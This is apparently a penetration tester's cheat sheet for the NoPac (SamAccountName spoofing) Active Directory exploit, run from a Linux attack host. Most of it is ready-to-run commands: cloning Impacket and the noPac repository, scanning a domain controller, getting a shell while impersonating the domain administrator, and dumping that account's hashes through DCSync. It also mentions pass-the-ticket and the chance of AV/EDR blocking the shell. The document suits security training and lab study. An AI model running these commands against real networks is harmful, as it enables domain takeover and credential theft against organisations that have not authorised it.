# From a Linux attack host
## NoPac (SamAccountName Spoofing)
This vuln allow us for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.
Exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller : https://github.com/Ridter/noPac
### Install Impacket
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
python setup.py install 
```
### Cloning the NoPac Exploit Repo
```bash
git clone https://github.com/Ridter/noPac.git
```
### Scanning for NoPac
```bash
sudo python3 scanner.py mydomin.local/username:password -dc-ip 192.168.0.1 -use-ldap
```
### Running NoPac & Getting a Shell
could be "noisy" or may be blocked by AV or EDR.
```bash
sudo python3 noPac.py MYDOMAIN.LOCAL/username:password -dc-ip 192.168.0.1  -dc-host PC'S-NAME -shell --impersonate administrator -use-ldap
``` 
the TGT is saved in the directory on the attack host: administrator_PC'S-NAME.MYDOMAIN.local.ccache
We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. 
We can also use the tool with the -dump flag to perform a DCSync using secretsdump.py.

### Using noPac to DCSync the Built-in Administrator Account
```bash
sudo python3 noPac.py MYDOMAIN.LOCAL/username:password -dc-ip 192.168.0.1  -dc-host APC'S-NAME --impersonate administrator -use-ldap -dump -just-dc-user MYDOMAIN/administrator
```
### Windows Defender & SMBEXEC.py
If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail.

## PrintNightmare



